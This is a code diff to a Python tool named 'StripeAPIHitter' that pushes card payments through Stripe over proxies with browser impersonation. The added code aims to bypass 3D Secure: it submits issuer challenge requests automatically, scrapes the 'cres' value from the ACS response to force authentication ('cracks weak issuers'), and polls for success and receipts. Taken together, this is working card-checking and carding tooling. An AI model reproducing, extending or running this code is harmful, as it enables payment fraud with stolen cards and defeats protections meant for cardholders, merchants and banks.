@@ -879,6 +879,21 @@ class StripeAPIHitter:
                                         await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     state = "redirected"
                                 elif source:
+                                    # --- 3DS Method URL completion (increases frictionless rate) ---
+                                    three_ds_method_url = sdk.get("three_ds_method_url")
+                                    if three_ds_method_url:
+                                        try:
+                                            import base64 as b64
+                                            method_payload = json.dumps({"threeDSServerTransID": source}, separators=(",", ":"))
+                                            method_data = b64.urlsafe_b64encode(method_payload.encode()).decode().rstrip("=")
+                                            session.post(three_ds_method_url,
+                                                data={"threeDSMethodData": method_data},
+                                                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                                timeout=10)
+                                            await asyncio.sleep(0.3)
+                                        except Exception:
+                                            pass
+
                                     auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                     auth_headers = {
                                         "accept": "application/json",
@@ -923,115 +938,112 @@ class StripeAPIHitter:
                                     }
 
                                     auth_resp = session.post(auth_url, headers=auth_headers, data=auth_data, timeout=30)
+                                    auth_json = {}
                                     try:
-                                        data = auth_resp.json()
-                                        state = data.get("state")
+                                        auth_json = auth_resp.json()
+                                        state = auth_json.get("state")
                                     except Exception:
-                                        state = "3DS Attempt failed"
-                                if state == "challenge_required":
-                                    return {
-                                        "status": False,
-                                        "result": {
-                                            "status": "declined",
-                                            "message": state,
-                                            "time": taken
-                                        }
-                                    }
+                                        state = None
 
-                            if state is None and 'data' in locals() and isinstance(data, dict) and 'error' in data:
-                                err = data.get('error', {})
-                                if "not supported" not in str(err.get('message', '')).lower():
-                                    result['decline_code'] = err.get('decline_code') or err.get('code') or '3ds_auth_failed'
-                                    result['error'] = f"Stripe rejected 3DS2 authenticate: {err.get('message', 'Unknown error')}"
-                                    return result
+                                    # --- ACS challenge auto-complete (cracks weak issuers) ---
+                                    if state == "challenge_required":
+                                        ares = auth_json.get("ares", {})
+                                        acs_url = ares.get("acsURL")
+                                        creq_val = auth_json.get("creq")
+                                        if acs_url and creq_val:
+                                            try:
+                                                acs_resp = session.post(acs_url,
+                                                    data={"creq": creq_val},
+                                                    headers={
+                                                        "Content-Type": "application/x-www-form-urlencoded",
+                                                        "User-Agent": auth_headers["user-agent"],
+                                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+                                                    },
+                                                    timeout=15, allow_redirects=True)
+                                                acs_text = acs_resp.text
+                                                # Extract cres from ACS response (hidden form field)
+                                                cres_match = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_text, re.I)
+                                                if not cres_match:
+                                                    cres_match = re.search(r'value=["\']([^"\']+)["\'].*?name=["\']?cres', acs_text, re.I)
+                                                if not cres_match:
+                                                    cres_match = re.search(r'["\']cres["\']\s*:\s*["\']([^"\']+)', acs_text, re.I)
+                                                if cres_match:
+                                                    cres_val = cres_match.group(1)
+                                                    ch_resp = session.post("https://api.stripe.com/v1/3ds2/challenge",
+                                                        data={"source": source, "cres": cres_val, "key": pk},
+                                                        headers=auth_headers, timeout=15)
+                                                    try:
+                                                        ch_data = ch_resp.json()
+                                                        if ch_data.get("state") in ["succeeded", "complete"]:
+                                                            state = ch_data.get("state")
+                                                    except Exception:
+                                                        pass
+                                            except Exception:
+                                                pass
 
-                            if state != "challenge_required":
-                                poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
-                                poll_headers = {
-                                    "accept": "application/json",
-                                    "origin": "https://js.stripe.com",
-                                    "referer": "https://js.stripe.com/"
-                                }
-                                poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)
-                                poll_json = poll_resp.json()
-                                status_2 = poll_json.get('status')
-                                if status_2 in ['succeeded', 'requires_capture', 'complete']:
-                                    result['success'] = True
-                                    receipt_url = find_receipt_url(poll_json)
-                                    if not receipt_url and pi and client_secret:
-                                        receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
-                                    if receipt_url:
-                                        result['receipt_url'] = receipt_url
-                                else:
-                                    next_act_2 = poll_json.get('next_action') or {}
-                                    if status_2 == 'requires_action' and next_act_2.get('type') == 'redirect_to_url':
-                                        redirect_url = next_act_2.get('redirect_to_url', {}).get('url')
-                                        return_url = next_act_2.get('redirect_to_url', {}).get('return_url')
-                                        if redirect_url:
-                                            await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                            
-                                            poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
-                                            poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                            poll_json_3 = poll_res_3.json()
-                                            poll_status_3 = poll_json_3.get('status')
-                                            
-                                            if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
-                                                result['success'] = True
-                                                result['final_url'] = return_url or redirect_url
-                                                receipt_url = find_receipt_url(poll_json_3)
-                                                if not receipt_url and pi and client_secret:
-                                                    receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
-                                                if receipt_url:
-                                                    result['receipt_url'] = receipt_url
-                                                return result
-                                                
-                                            result['decline_code'] = '3d_secure_required_hard'
-                                            result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
-                                            result['final_url'] = return_url or redirect_url
-                                            return result
+                            # --- ALWAYS POLL — authenticate outcome is not ground truth ---
+                            await asyncio.sleep(0.5)
+                            poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
+                            poll_headers = {
+                                "accept": "application/json",
+                                "origin": "https://js.stripe.com",
+                                "referer": "https://js.stripe.com/"
+                            }
+                            poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)
+                            poll_json = poll_resp.json()
+                            status_2 = poll_json.get('status')
 
-                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
-                                    if isinstance(err, dict) and err.get('message'):
-                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
-                                        result['error'] = err.get('message', 'Unknown error')
-                                    else:
-                                        result['decline_code'] = status_2
-                                        next_act = poll_json.get('next_action') or {}
-                                        result['error'] = f"Stuck in requires_action. next_action: {next_act}"
+                            if status_2 in ['succeeded', 'requires_capture', 'complete']:
+                                result['success'] = True
+                                receipt_url = find_receipt_url(poll_json)
+                                if not receipt_url and pi and client_secret:
+                                    receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
+                                if receipt_url:
+                                    result['receipt_url'] = receipt_url
                                 return result
-                            elif next_action.get('type') == 'redirect_to_url':
-                                redirect_url = next_action.get('redirect_to_url', {}).get('url')
-                                return_url = next_action.get('redirect_to_url', {}).get('return_url')
-                                
-                                if redirect_url:
-                                    await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                    
-                                    poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
-                                    poll_res = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                    poll_json = poll_res.json()
-                                    poll_status = poll_json.get('status')
-                                    
-                                    if poll_status in ['succeeded', 'requires_capture', 'complete']:
+
+                            # Handle redirect_to_url from poll (covers both initial and post-auth redirects)
+                            next_act_2 = poll_json.get('next_action') or {}
+                            if status_2 in ['requires_action', 'requires_source_action'] and next_act_2.get('type') == 'redirect_to_url':
+                                redir_url = next_act_2.get('redirect_to_url', {}).get('url')
+                                ret_url = next_act_2.get('redirect_to_url', {}).get('return_url')
+                                if redir_url:
+                                    await loop.run_in_executor(None, lambda u=redir_url: cffi_requests.get(u, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    await asyncio.sleep(0.5)
+                                    poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
+                                    poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    poll_json_3 = poll_res_3.json()
+                                    if poll_json_3.get('status') in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
-                                        result['final_url'] = return_url or redirect_url
-                                        receipt_url = find_receipt_url(poll_json)
+                                        result['final_url'] = ret_url or redir_url
+                                        receipt_url = find_receipt_url(poll_json_3)
                                         if not receipt_url and pi and client_secret:
                                             receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                         if receipt_url:
                                             result['receipt_url'] = receipt_url
                                         return result
-                                        
                                     result['decline_code'] = '3d_secure_required_hard'
                                     result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
-                                    result['final_url'] = return_url or redirect_url
+                                    result['final_url'] = ret_url or redir_url
                                     return result
+
+                            # Extract error from poll — this is ground truth
+                            err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
+                            if isinstance(err, dict) and err.get('message'):
+                                result['decline_code'] = err.get('decline_code', err.get('code', status_2))
+                                result['error'] = err.get('message', 'Unknown error')
+                            elif state == "challenge_required":
+                                result['decline_code'] = 'challenge_required'
+                                result['error'] = 'Card issuer requires interactive 3D Secure (OTP/app approval).'
+                            else:
+                                result['decline_code'] = status_2 or '3ds_unknown'
+                                next_act = poll_json.get('next_action') or {}
+                                result['error'] = f"Post-3DS status: {status_2}. next_action: {next_act}"
+                            return result
                         except Exception as ex:
-                            print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
+                            print(f"DEBUG: 3DS bypass failed: {ex}")
                             result['decline_code'] = f'3d_secure_exception_{str(ex)[:30]}'
                             return result
-                            
-                        result['decline_code'] = f"3d_secure_fallback_type_{next_action.get('type', 'none')}"
-                        return result
                     elif status == 'requires_payment_method':
                         result['decline_code'] = 'generic_decline'
                         result['error'] = 'Payment requires a new payment method (generic decline)'
